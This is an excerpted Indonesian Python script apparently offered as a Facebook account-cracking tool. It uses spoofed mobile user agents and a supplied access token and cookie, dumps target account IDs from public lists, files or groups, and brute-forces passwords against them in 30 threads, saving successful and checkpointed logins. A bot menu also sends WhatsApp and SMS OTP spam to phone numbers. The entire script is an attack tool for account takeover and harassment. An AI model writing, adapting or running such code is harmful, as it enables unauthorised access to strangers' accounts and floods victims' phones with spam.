#-----------------[ DIRACIK DENGAN BUMBU² SEDERHANA ]-------------------#
...
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as ______bang__lu_ko_suka_sama_dia
...
for xd in range(10000):
	...
	k=random.randrange(110,160)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i} {l}'
	ugen.append(uaku2)
...
def banner():
	...
	sayang_kamu(f"""
{b}▀▀█▀▀ ▒█▀▀█ ▀█▀ ▒█▀▀█ ▒█░░░ ▒█▀▀▀ 　 ▀▀▀█ {k} NOTE : 
{x}░▒█░░ ▒█▄▄▀ ▒█░ ▒█▄▄█ ▒█░░░ ▒█▀▀▀ 　 ░░█░  gunakan sc ini dengan bijak
{b}░▒█░░ ▒█░▒█ ▄█▄ ▒█░░░ ▒█▄▄█ ▒█▄▄▄ 　 ░▐▌░  {x}dosa di tanggung masing²""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		...
		try:
			fiks = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			fikkeren = json.loads(fiks.text)['id']
			menu(fikkeren)
		except KeyError:
			login_lagi334()
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		prints(Panel('[white]jangan gunakan akun pribadi',width=35,padding=(0,1),style=f"{color_table}"))
...
def menu(id):
	...
	prints(Panel(f'[white]YOUR ID :[green] {id}\t[white]STATUS : [green]PRIBADI\n[white]YOUR IP :[green] {ip} \t[white]CODED BY : FIKS X',title=f"[white]•INFORMASI•",width=80,padding=(0,1),style=f"{color_table}"))
	prints(Panel(f''' [white][1] 𝐂𝐑𝐀𝐂𝐊 𝐏𝐔𝐁𝐋𝐈𝐂\t [4] CRACK PENGIKUT\t [7] KELUAR\n [2] 𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄 \t [5] CRACK MEMBER GRUP\n [3] 𝐇𝐀𝐒𝐈𝐋 𝐂𝐑𝐀𝐂𝐊\t [6] HUBUNGI AUTHOR ''',title=f"[green]•MENU•",width=80,padding=(0,1),style=f"{color_table}"))   
	prints(Panel(f'[white]Ketik [red]bot [white]untuk ke menu bot',width=50,padding=(0,1),style=f"{color_table}"))
	_____fik_keren_____ = input(' PILIH : ')
	if _____fik_keren_____ in ['1']:
		dump_massal()
	elif _____fik_keren_____ in ['2']:
		crack_file()
	elif _____fik_keren_____ in ['3']:
		result()
	elif _____fik_keren_____ in ['4']:
	    print(f'{m}maaf fitur ini sedang di perbarui{x}')
	elif _____fik_keren_____ in ['5']:
	    print(f'{m}maaf fitur ini sedang di perbarui{x}')
	elif _____fik_keren_____ in ['7']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(' Sukses Logout+Hapus Kukis ')
		exit()
	elif _____fik_keren_____ in ['6']:
	    os.system('xdg-open https://wa.me/+6283877893807?text=Halo+abangku+keren');exit()
	elif _____fik_keren_____ in ['bot','Bot']:
	    bot()
	else:
...
def dump_massal():
	try:
		...
		exit()
	prints(Panel(f'[white]𝐌𝐀𝐒𝐔𝐊𝐀𝐍 𝐉𝐔𝐌𝐋𝐀𝐇 𝐓𝐀𝐑𝐆𝐄𝐓 ',width=40,padding=(0,1),style=f"{color_table}"))
	try:
	...
	try:
		print('')
		print(f' 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐙 : {x}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def crack_file():
	...
	if len(vin)==0:
		...
		prints(Panel(f'[white]BUAT DULU FOLDER DUMP,MASUKAN FILE DUMP KE FOLDER DUMP [white]',width=80,padding=(0,1),style=f"{color_table}"))
		time.sleep(2)
		exit()
	else:
		cih = 0
		...
		setting()
def bot():
	prints(Panel(f"[01] Spam WhatsApp [[bold green] ON [bold white]]\n[02] Spam Sms [[bold green] ON [bold white]]\n[03] Kembali Ke Awal [[bold green] ON [bold white]]",width=80,title=f"[bold green]Menu Bot",padding=(0,8),style=f"bold white"))
	bray = input(f' PILIH : ')
	if bray in(''):
...
class sxp_sms:
	...
	def main(self):
		...
		cetak(Panel(f"Sukses Spam SMS Ke No : +62{nomor}",width=80,padding=(0,2),style=f"bold white"))
...
class sxp_wa:
	...
	def main(self):
		...
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(Panel(f" Sukses Spam WA Ke No : [red]+62{nomor}",width=80,padding=(0,2),style=f"bold white"))
		
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	prints(Panel(f'[white]1.𝐀𝐊𝐔𝐍 [red]𝐎𝐋𝐃\n[white]2.𝐀𝐊𝐔𝐍 [green]𝐍𝐄𝐖\n[white]3.[red]𝐑𝐀𝐍[green]𝐃𝐎𝐌 [white]',width=30,padding=(0,1),style=f"{color_table}"))
	hu = input(' PILIH : ')
	if hu in ['1','01']:
		...
		exit()
	prints(Panel(f'''[white]1.METHOD [green]V1\n[white]2.METHOD [yellow]V2 [white]''',title=f"[green]•METHODE•",width=40,padding=(0,1),style=f"{color_table}"))
	hc = input(f' PILIH : ')
	if hc in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():	
	prints(Panel(f'\t [white]    ＣＲΛＣＫ░ＳΣＤΛＮＧ░ＢΣＲＪΛＬΛＮ ススブ',width=80,padding=(0,1),style=f"{color_table}"))
	cetak(nel(f'''[white]akun [green]OK [white]tersimpan di {okc}
akun [yellow]CP [white]tersimpan di {cpc}''',title=f'[green]•RESULT•[white]',width=80,padding=(0,1),style=f"{color_table}"))
	print(f'')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(" CRACK SELESAI BRO JANGAN LUPA BERSUKUR")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r CRACK {P}[{loop}{b}/{P}{len(id)}{P}]•{P}[{H}OK {ok}{P}]•{P}[{k}CP {cp}{x}]•[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{k} [CECKPOINT] {idf}|{pw}{N}')
